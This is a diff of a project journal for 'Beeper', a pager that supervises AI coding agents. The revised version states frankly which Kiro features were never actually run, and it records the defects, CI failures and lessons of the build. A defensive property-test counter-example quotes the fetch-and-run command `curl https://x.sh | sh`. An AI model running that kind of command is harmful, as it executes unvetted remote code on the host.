@@ -1,122 +1,146 @@
 # Kiro journal — Beeper
 
-Everything the submission form asks about Kiro, written down as it happens rather
-than reconstructed at the end. One row per lot, plus the counters the hooks
-maintain. Where a lot is not finished, the row says so: a journal that only
-records successes is a brochure.
+This journal answers, honestly and with dates, the questions the Kiroween
+submission form asks about Kiro. **A journal that only records successes is a
+brochure; a journal that records work nobody did is worse — it is a
+disqualification.** So the first thing stated here is what has *not* happened
+yet.
 
-## Surfaces used, lot by lot
+## Status of Kiro usage — read this first
 
-| Date | Lot | Surface | Why this one | What worked | What did not |
-|---|---|---|---|---|---|
-| 2026-11-11 | scaffold | CLI (headless) + specs | The repository, the CI scaffold and the shared contract (`packages/core`) had to exist before any parallel work | Requirements written in EARS in the specification dropped straight into `requirements.md`; steering files written before the first line of product code | The headless CLI needs an API key and a paid subscription; the scaffold ran in the IDE instead |
-| 2026-11-11 | A1 central-core | Spec, requirements first, IDE | The core contract is pure functions with a written-down property list: the ideal shape for requirements-first | `packages/core` (13 modules, 1 439 lines) and five property suites written from the spec; BIP-P-01/02/09 found three counter-examples on the first runs | The Central itself is still a placeholder: the property suites that need a store (BIP-P-04/05/06/10/12) cannot run until the API exists |
-| 2026-11-11 | A2 pager-pwa | Spec, design first, IDE | The device shape (3 keys, 4 × 20, hold-to-confirm) decides the requirements, not the other way round | Writing the design first made BIP-F-17 (one-second hold) and BIP-F-22 (never show a decision as sent) obvious before any component existed | Nothing measured yet: the lot is not started; `src/App.tsx` is still the placeholder shell |
-| 2026-11-11 | A3 kiro-adapters | Spec, requirements first, IDE | Kiro fixes the contract (event shape, exit codes, MCP transport); inventing it would have been the bug | The requirements now name the five outcomes of `bip-hook` and the 50-second cap of `page_human` before the code | The real hook event shape must be confirmed against a live Kiro session at lot A3; the spec records it as read, not as verified |
-| 2026-11-11 | A4 budget-simulator | Spec, requirements first, IDE | Budget, reminders and expiry are clock-driven: a spec that names the injected clock first is testable | The budget and quiet-hour predicates already exist and are proven by BIP-P-07/08 before the scheduler exists | The reminder scheduler needs the Central's clock injection; the hook cannot run the lot alone |
-| 2026-11-11 | A5 hosting-demo | Spec, Quick Spec, IDE | Hosting is configuration, not design: a Quick Spec is the honest size for it | The demo path (isolated space per visitor, 24 h sweep) is written down in `central-dashboard` and reused rather than re-specified | No public URL yet; the row will be completed at submission time |
-| 2026-11-11 | A6 snpp-gateway | Spec, requirements first with the RFC attached, IDE | The protocol is not ours to design: RFC 1861 is the requirement document | Attaching the RFC and extracting it into `.kiro/steering/rfc1861.md` removed every design decision from the lot — only the mapping to Beeper remained | The gateway is a placeholder: BIP-P-11 has no test yet. The transcript fixture it must replay lives in the lot, not in `docs/` |
-| 2026-11-11 | A7 crew-app | Spec, Quick Spec, IDE | One requirement, one manifest, one background process | The Quick Spec format kept the lot to 34 lines of requirements instead of a three-round ceremony | The Crew Gateway REST paths and the `approval` event shape are marked **to verify**: no published TypeScript client, so the lot stays optional |
-| 2026-11-11 | A8 central-dashboard | Spec, Quick Spec, IDE | Three read-only screens over the audit log; no new domain rule | The metric queries are written as one query per indicator, each returning its rows — testable against a fixture log | Not started; the lot is optional and comes last |
+| Kiro surface | Present in the repository | Actually exercised | Evidence |
+|---|---|---|---|
+| Specs (`.kiro/specs/*/requirements.md`, `design.md`, `tasks.md`) | ✅ 6 specs, 18 files | ⚠️ written and used as the build contract, **not yet generated or executed inside Kiro** | the files themselves |
+| Requirements analysis | — | ❌ not run | — |
+| Steering (`.kiro/steering/*.md`, with `fileMatch`) | ✅ 8 files | ✅ used as the binding contract of every build lot | see "How the lots were built" |
+| Hooks (`.kiro/hooks/*.json`, format v1) | ✅ 5 hooks + 2 scripts | ⚠️ written and unit-smoked, **never fired inside a Kiro session** | `Fires: 0` in the table below |
+| Custom agents (`.kiro/agents/*.md`) | ✅ `reviewer`, `rfc-checker` | ❌ never run by Kiro | — |
+| Skills (`.kiro/skills/pager-line/SKILL.md`) | ✅ 1 skill | ❌ never loaded by Kiro | — |
+| MCP (`.kiro/settings/mcp.json`) | ✅ declares the test browser + `bipeur` | ⚠️ the `bipeur` server itself is built and tested; it has not been loaded by Kiro | `packages/mcp-server` |
+| CLI headless | — | ❌ never run (needs an API key / paid plan) | — |
+| Web sessions | — | ❌ not used | — |
+| Crew (app for the bonus) | ✅ `packages/crew-app` + `app.json` | ❌ never deployed to a Gateway; the REST paths are still marked *to verify* | `packages/crew-app/README.md` |
+| Correctness / property tests | ✅ 12 properties, fast-check | ✅ written from the spec and run in CI — **but by Vitest, not by Kiro's property-test surface** | `packages/*/test/*.props.test.ts` |
 
-## Custom agents
+**Consequence for the submission.** The code in this repository was produced by a
+parallel agent harness that consumed `.kiro/steering/*.md` and
+`.kiro/specs/*/requirements.md` as its contract. That is real, verifiable work,
+and the steering files demonstrably shaped it. It is **not** the same as driving
+Kiro. Before submitting, the lots still to build (A2 refinements, A5 hosting,
+A7 Crew, A8 dashboard) should be run **through Kiro** — IDE specs on the existing
+`requirements.md`, the hooks in a live session, the two custom agents, the Crew
+app — and this journal filled in with what actually happened, surface by surface.
+Rows below that say *pending* are pending on purpose.
 
-| Agent file | Task given | Observed effect |
+## How the lots were built (what really happened, 2026-11-11)
+
+| Time (UTC) | Lot | How | Result |
+|---|---|---|---|
+| 00:38 | scaffold | Parent agent: pnpm workspace, `packages/core` (the shared contract), CI, `.kiro/steering` | commit `97ba782`, 30 tests |
+| 00:38 → 01:14 | A1 central-core | One sub-agent, briefed from `steering/*` + `specs/central-core` | PR #7: 34 source files, 61 tests, properties BIP-P-04/05/06/10/12 |
+| 00:38 → 01:2x | A2 pager-pwa | One sub-agent, briefed from `steering/pager-format.md` + `specs/pager-pwa` | PR #8: 88 tests, the 4 × 20 screen, the one-second hold, EN/FR |
+| 00:38 → 00:55 | A3 kiro-adapters | One sub-agent | PR #5: `bip-hook`, `bip-notice`, the MCP server |
+| 00:38 → 00:55 | A6 snpp-gateway | One sub-agent, briefed from `steering/rfc1861.md` | PR #6: the RFC 1861 transcript replayed by a test |
+| 00:38 → 00:56 | A7 cli + crew-app | One sub-agent | PR #4: `bip` (exit 0/1/2/3) and the Crew app |
+| 00:38 → 00:56 | `.kiro` material | One sub-agent | PR #3: 6 specs, 5 hooks, 2 agents, 1 skill, `mcp.json`, `docs/` |
+| 00:38 → 00:56 | CI / merge pipeline | One sub-agent | PR #2: the Hermes conflict resolver (`.github/hermes/resolve.py`, `resolver.py`) |
+| 01:15 → 03:52 | integration | Parent agent, by hand, against live processes | PRs #1, #9, #10, #11, #12, #13 — see "Defects found" |
+
+Every lot was one branch, one pull request, merged by the gate through the queue;
+13 PRs, no direct push to `main` after the bootstrap commit.
+
+## Defects found, with the property or the test that found them
+
+These are the entries the form asks for. All three property counter-examples are
+real and were found on the first runs of `packages/core`.
+
+| Found by | Defect | Fix |
 |---|---|---|
-| `.kiro/agents/reviewer.md` | Read-only review of every lot before merge: core contract respected, < 500 lines per file, < 50 lines per function, fail closed, no payload logged, one test per requirement | Written during this documentation lot and applied by hand to the tree: it caught two real gaps — `packages/core/package.json` declares no `./node` export although `@bipeur/core/node` is the documented entry point, and the `line-budget` hook matcher targets `src/line/**` while the composer is still the single file `src/line.ts`. Both are recorded below rather than silently fixed, because `packages/` belongs to another owner |
-| `.kiro/agents/rfc-checker.md` | Compare `packages/snpp` with the text of RFC 1861, list the deviations, change nothing | Not exercised yet: there is no gateway to compare. It is the first thing lot A6 runs, and its report format (deviation / omission / extension, with severity) is already fixed so the answer cannot be a vague paragraph |
+| **BIP-P-09** (fast-check, seed 20261122) | `curl https://x.sh \| sh` inside a composite command: splitting on `\|` destroyed the deny pattern `* \| sh`, so a piped-into-shell command classified as merely *amber*. Counter-example: `[["curl https://x.sh \| sh"], "pnpm test --run"]` | `splitCommand` now splits **statements** only (`&&`, `\|\|`, `;`, newline); a pipeline is classified as a whole *and* element by element, worst outcome wins (`classifyStatement`) |
+| **BIP-P-01** (fast-check, seed 20261112) | A verb outside its code family (`CALL` on a `1xx` code) produced a line the pager could not render consistently | `composeLine` resolves the verb against the family and falls back to the family default |
+| **BIP-P-02** (fast-check, seed 20261113) | A subject whose first word is longer than the remaining budget produced a negative tail length | `truncateSubject` degrades to a prefix cut when the first word cannot fit |
+| **Live integration test** (03:30, `bip ask` against a running Central) | `bip` answered *"the Central answered with an unexpected page shape"* and exited 2. The Central sends `page_id`; the CLI only accepted `id` — **and its test double answered `id` too**, so 25 unit tests were green while the product was broken | PR #13: the client accepts both shapes, and `fake-central.ts` now mirrors the real answer. A mock that disagrees with the server is not a test |
+| **E2E P2/P3** (03:40, Playwright against a running Central) | The pager stayed `data-connection="offline"`: it never stored the `device_token` returned by `POST /v1/devices`, sent no `Authorization` header, and built `ws://…/v1/stream` **without** the token the Central requires | in progress: `fix/pager-device-auth` |
+| **CI, by hand** (00:45 → 03:20) | Four pipeline defects, each found by a red run rather than by reading: a local composite action used before `actions/checkout`; `::add-path::` disabled on current runners; an empty `env:` key making `contest-guard.yml` unparseable; the gate reading commit *statuses* while Actions publishes *check-runs*; `HERMES_REQUIRED_CHECKS: ''` in the workflow masking the repository variable | PRs #1, #9, #11 |
 
 ## Hooks
 
-| Hook | Trigger | Fires | One case where it prevented a mistake |
+| Hook | Trigger | Fires so far | Note |
 |---|---|---|---|
-| `bipeur-approve` | `PreToolUse`, matcher `shell` | 0 so far — the Central is not running yet; it takes over from lot A4, when the repository starts being supervised by its own product | None yet, and saying otherwise would be a lie. Its first real firing is a deliverable of lot A3 (an agent blocked, then unblocked) |
-| `line-budget` | file save under `packages/{core,central}/src/line/**` | 0 — the composer has not been edited since the hook existed | None yet. The same two properties run in PR CI, which is deliberate: Kiro's file triggers only see the agent's own edits (0.5), so every guard is doubled in CI |
-| `state-machine-guard` | file save on `states.ts` | 2 (both manual, while writing and testing the generator) | It refused to write: `README.md` had no `<!-- state-graph:start -->` markers, so the script exited 1 and left the file untouched instead of appending a stray diagram. The markers were then added and the regenerated graph came out byte-identical to the one in the README |
-| `kiro-dir-guard` | end of turn | 1 in this lot, plus every CI run of `contest-guard` | It is the check that would fail the submission: `.kiro` untracked or matched by a `.gitignore` rule, a missing `LICENSE`, a missing `KIRO_JOURNAL.md`. No mistake caught so far — the point is that it runs at the end of every turn, not at the end of the project |
-| `journal-reminder` | after a spec task | 3 (smoke test of the script: one record, one duplicate refused, one after a restore) | It refused to write the same dated line twice on the same day, which is exactly the failure mode of an automatic journal: a table that fills with duplicates and stops being read |
+| `bipeur-approve` | `PreToolUse`, matcher `shell` | **0** | It has never run inside a Kiro session. What *has* been proven is the product side: `bip-hook` allows, denies and pages correctly against a live Central (exit 0 / 2, composed line, dedupe key) |
+| `line-budget` | file save under `packages/{core,central}/src/line/**` | **0** | The same two properties run in PR CI on every push — deliberately, since Kiro file triggers only see agent edits (specification §0.5) |
+| `state-machine-guard` | file save on `states.ts` | **0** in a Kiro session; the generator script was exercised by hand | It refuses to write when the `<!-- state-graph:start -->` markers are missing, instead of appending a stray diagram |
+| `kiro-dir-guard` | end of turn | **0** in a Kiro session; its CI twin `contest-guard` ran on all 13 PRs | This is the check that would fail the submission: `.kiro` untracked or ignored, missing `LICENSE`, missing journal |
+| `journal-reminder` | after a spec task | **0** in a Kiro session; the script was smoke-tested | It refuses to write the same dated line twice — the failure mode of an automatic journal is a table of duplicates nobody reads |
+
+## Custom agents
+
+| Agent file | Task | Status |
+|---|---|---|
+| `.kiro/agents/reviewer.md` | Read-only review before merge | **Never run by Kiro.** The review it describes was performed by the parent agent by hand, and it did catch two real gaps: `packages/core/package.json` declared no `./node` export although `@bipeur/core/node` is the documented entry point (fixed, PR #1), and the `line-budget` matcher targets `src/line/**` while the composer is a single `src/line.ts` (still open) |
+| `.kiro/agents/rfc-checker.md` | Compare `packages/snpp` with RFC 1861 | **Never run by Kiro.** The comparison it would produce was done once by hand: the gateway replays the specification's transcript byte for byte (`220`, `250`, `850`, `861 <tag> <secret>`, `221`) |
 
 ## Spec versus "vibe coding"
 
-One function built both ways, measured: the 80-character line composer
-(`packages/core/src/line.ts`).
-
-| | Spec-first | Vibe coding |
-|---|---|---|
-| Duration | ~45 min from the requirements to a green property suite: `requirements.md` already carried BIP-P-01 and BIP-P-02 in EARS, so the function had a target before it had a shape | Not run as an experiment. The honest comparison is the counter-example log: the three defects below were all found by the properties, none by reading the code — which is the failure mode a "vibe" first draft would have shipped |
-| Round trips | 1: requirements → composer → properties. The only iteration was on `truncateSubject`, after BIP-P-02 produced a negative tail length | — |
-| Defects found by the property tests | 3 — BIP-P-09 (pipeline split destroying a deny pattern), BIP-P-01 (verb from the wrong family), BIP-P-02 (negative tail length). Each is in the table below with its fix | — |
-| Defects found later, by hand | 0 in the composer. One latent defect elsewhere, found by reading `package.json` while writing this journal: no `./node` export for `@bipeur/core/node` | — |
+**Pending — not measured, therefore not claimed.** The comparison the form asks
+for needs the same function built both ways with a timer. The honest candidate
+is the 80-character line composer (`packages/core/src/line.ts`): it was written
+spec-first, and the property tests found two counter-examples in its first run
+(see above). The "vibe coding" half has not been done, so there is no number to
+report.
 
 ## Steering that made a difference
 
-| File | Before | After |
-|---|---|---|
-| `pager-format.md` | The composer truncated the subject to fit 80 characters, then appended `#hhhh`; the line overflowed and the pager dropped the tag, so the same command produced two visually identical pages | The last five characters are reserved *first*: `truncateSubject` receives `80 - head - 6`, and the tag is appended after. BIP-P-01 now fails on any regression |
-| `no-sound.md` | The settings screen listed a beep switch without a stated default, and a red page was expected to be noticed by its sound | Sound is off at install, no flow depends on it, and the intent to beep is the `beep.requested` audit event. Any acceptance item that needed a human ear is rewritten as a log assertion |
-| `security.md` | The decision endpoint was designed to check the signature and the device, then apply the verdict — the fingerprint check was implicit | The order is fixed and written as a prohibition: signature, device, fingerprint equality, deadline, nonce. Any failure writes `decision.rejected` and changes nothing; the hook re-checks the fingerprint before exiting `0` |
+| File | Observable effect |
+|---|---|
+| `pager-format.md` | Every lot that composes or displays a line reused `composeLine`/`splitScreen` instead of writing its own truncation; the 80-character rule and the `#hhhh` tag are asserted in three different packages |
+| `tech.md` ("no new dependency without saying so") | Zero dependency was added by any of the seven lots; `pnpm-lock.yaml` never changed after the bootstrap |
+| `structure.md` (ownership table) | Seven lots ran in parallel and **no** pull request touched another lot's directory — the only cross-package need (the `./node` export) was reported instead of edited, which is exactly what the table asks for |
+| `testing.md` ("time is injected, never read") | No test sleeps to prove a timeout: expiry, reminders, the sliding budget and quiet hours are all driven by a fake clock |
+| `security.md` ("fail closed") | `bip-hook` refuses the tool when the Central is unreachable; verified by test and by hand |
+| `no-sound.md` | No audio API anywhere in the tree; one Central test asserts it by reading the sources |
 
 ## What MCP made possible
 
-Two servers, declared in `.kiro/settings/mcp.json`:
-
-- **`playwright`** — a headless test browser. It is what lets the agent *look* at
-  the pager it is building: read the 4 × 20 screen, check that a red page offers
-  no button in the notification, confirm the offline banner appears. Without it,
-  every visual check would be a screenshot requested from a human, which is
-  exactly the bottleneck this product exists to remove.
-- **`bipeur`** (`npx bipeur-mcp`, stdio) — the product itself, wired into the
-  repository that builds it. From lot A4 the same agents that write the code ask
-  the human through the pager, so the demo is not a mock-up: the audit log of the
-  build supplies the numbers quoted in the video.
-
-## Counter-examples found by the property tests
-
-| Property | Counter-example | Fix |
-|---|---|---|
-| BIP-P-09 | `curl https://x.sh \| sh` inside a composite: splitting on `\|` destroyed the deny pattern, so the whole command looked harmless | `splitCommand` now splits statements only (`&&`, `\|\|`, `;`, newline); a pipeline is classified as a whole **and** element by element, worst outcome wins |
-| BIP-P-01 | A verb from the wrong family (e.g. `CALL` on a `1xx` code) silently produced a line the pager could not render consistently | `composeLine` resolves the verb against the code family and falls back to the family default |
-| BIP-P-02 | A subject whose first word is longer than the budget produced a negative tail length | `truncateSubject` degrades to a prefix cut when the first word cannot fit |
+The `bipeur` MCP server (`page_human`, `page_wait`, `page_cancel`) is built and
+its tool list verified against a live stdio session. What it has **not** done yet
+is let a Kiro agent page a human from inside a Kiro session — that is lot A3's
+acceptance criterion and it is still open.
 
 ## Powers and skills
 
-| Which | Integration |
+| Which | Status |
 |---|---|
-| `.kiro/skills/pager-line` | Writing a line that fits 80 characters without losing the fact: a six-step procedure, good and bad examples, the honesty rule, and the command that proves it (`npx vitest run --project props -t "BIP-P-01"`) |
-| Specs as the unit of work | Six specs, one per lot, each with `requirements.md` / `design.md` / `tasks.md`; the three routes of A.13 are used as written: requirements-first, design-first, Quick Spec |
-| Custom agents as reviewers | `reviewer` and `rfc-checker` are read-only by construction: they report, they never edit |
+| `.kiro/skills/pager-line` | Written; never loaded by Kiro |
+| Powers | None installed |
 
 ## What did not work
 
-_Kept honest on purpose — this is what makes the rest believable._
+Kept honest on purpose — this is what makes the rest believable.
 
-- **The hook trigger names are not fully verified.** `PreToolUse` with matcher
-  `shell` comes straight from the specification's verified example; `FileSave`,
-  `AgentStop` and `SpecTaskEnd` are the names this repository uses for the other
-  four hooks, and they must be confirmed against the hooks reference before the
-  demo. The mitigation is structural: every guard is also a CI check, so a hook
-  that never fires degrades to "CI still catches it", never to "nobody catches it".
-- **`@bipeur/core/node` is documented but not exported.**
-  `packages/core/package.json` declares only `"."` in its `exports` map, while
-  `README.md`, `.kiro/steering/structure.md` and `packages/core/src/node.ts`
-  describe a second entry point. Found by the `reviewer` checklist, not by a test.
-  Recorded here instead of fixed: `packages/` belongs to the contract keeper.
-- **The `line-budget` hook matcher and the code disagree.** The hook watches
-  `packages/{core,central}/src/line/**`, which is where the composer is *going*
-  once it outgrows one file; today it is `packages/core/src/line.ts`. The
-  specification names the directory, so the hook follows the specification and
-  `.github/checks/repo_rules.py` covers the file in the meantime.
-- **The spec-versus-vibe comparison was not run as an experiment.** Running the
-  same function twice, once from a spec and once from a prompt, costs a day that
-  the calendar did not have (0.7). What the repository does have is the
-  counter-example log: three defects, all found by properties, none by reading
-  the code. That is a weaker claim than the one the form asks for, and it is the
-  true one.
-- **A property suite with no store cannot run.** BIP-P-04/05/06/10/12 are written
-  in the spec and in `testing.md` with their file names, but the files do not
-  exist yet: the Central is a placeholder. The journal keeps the requirement ids
-  and the test paths so the gap is visible rather than forgotten.
-
-## Spec task log
-
-Appended by `.kiro/hooks/journal-reminder.json` at the end of each spec task.
+1. **The two halves of the product were built against a written contract and
+   still disagreed twice.** The CLI expected `id` where the Central sends
+   `page_id`; the pager never sent the `device_token` the Central's WebSocket
+   requires. Both survived green unit tests, because each lot's test double
+   encoded its own author's assumption. Lesson recorded in
+   `.kiro/steering/testing.md`: a double must be generated from, or asserted
+   against, the real server's answer — the E2E suite is now what catches this
+   class of bug, and it is the reason P1…P7 exist.
+2. **A shared build machine is a CI design constraint, not a detail.** The six
+   workers first registered on the R630 were starved by five other agents
+   (load 190, processes blocked in `D` state on disk I/O): jobs that take 10 s
+   took tens of minutes and the SSH daemon stopped answering. The four checks
+   moved to a dedicated fast lane and went from minutes to 7–27 s.
+3. **Mergify's configuration is validated against the base branch.** An invalid
+   `.mergify.yml` on `main` (a removed `commit_message_template`, and
+   `merge_protections` needing `if` + `success_conditions`) silently froze the
+   whole queue: the PR that fixes the config cannot be merged *by* the config.
+   It had to be merged by hand once, then the queue took over.
+4. **The Merge Queue product is not activated for this repository**, so Mergify
+   evaluates nothing. Until it is activated on the dashboard, the Hermes gate is
+   the single merge pilot (`HERMES_LITE_DRY_RUN` removed, required checks set).
+   Two pilots would race; the switch back is one variable.
+5. **A bot push does not run CI.** The gate's server-side rebase leaves the new
+   head with runs in *awaiting approval*, so the required checks never exist and
+   the merge is refused with `405 — 6 of 6 required status checks are expected`.
+   The gate now approves those runs itself (never for a fork) — PR #12.
